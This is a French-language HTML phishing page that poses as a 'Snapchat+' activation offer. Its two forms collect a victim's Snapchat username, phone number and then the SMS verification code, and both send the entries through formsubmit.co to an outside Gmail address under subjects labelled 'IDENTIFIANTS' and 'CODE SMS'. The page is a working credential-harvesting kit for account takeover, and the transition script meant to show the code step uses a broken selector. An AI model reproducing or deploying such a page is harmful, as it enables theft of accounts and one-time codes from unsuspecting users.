                    

                <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Plus</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Ton fond personnalisé */
            background-image: url('fond.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        /* Carré jaune */
        .snap-logo {
            width: 100px;
            height: 100px;
            background-color: #FFFC00;
            border-radius: 25px;
            margin: 0 auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        /* Fantôme blanc SVG amélioré */
        .ghost-svg {
            width: 60px;
            height: 60px;
            fill: #FFFFFF;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p {
            color: #555;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
            background-color: #fff;
        }

        input:focus {
            border-color: #FFFC00;
        }

        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Carré jaune avec fantôme amélioré -->
        <div class="snap-logo">
            <svg class="ghost-svg" viewBox="0 0 24 24">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h8c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.87-3.13-7-7-7zm-2.5 14.5v2h-1v-2h1zm5 0v2h1v-2h-1zm-2.5 1c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1z"/>
            </svg>
        </div>

        <!-- Étape 1 : Infos (Nom + Numéro) -->
        <div id="step-1">
            <h1>Obtenez Snapchat+</h1>
            <p>Vérification requise pour activer votre profil.</p>
            
            <!-- Envoi de l'email 1 -->
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="Snapchat+ - IDENTIFIANTS">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="">

                <div class="form-group">
                    <label for="username">Nom d'utilisateur Snapchat</label>
                    <input type="text" id="username" name="username" placeholder="Ex: john_doe" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                </div>

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS (Apparaît après le clic) -->
        <div id="step-2">
            <h1>Vérification</h1>
            <p>Nous avons envoyé un code à votre numéro.</p>
            
            <!-- Envoi de l'email 2 -->
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <input type="hidden" name="_subject" value="Snapchat+ - CODE SMS">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="">

                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                </div>

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
            
            <p class="small-note">Le code peut prendre quelques minutes à venir.</p>
        </div>

    </div>

    <script>
        // Transition automatique après le clic sur "Vérifier"
        document.getElementById('step-1 form').addEventListener('submit', function(e) {
            // On empêche la rechargement immédiat pour laisser le temps à l'animation
            setTimeout(() => {
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
            }, 200);
        });
    </script>
</body>
</html>
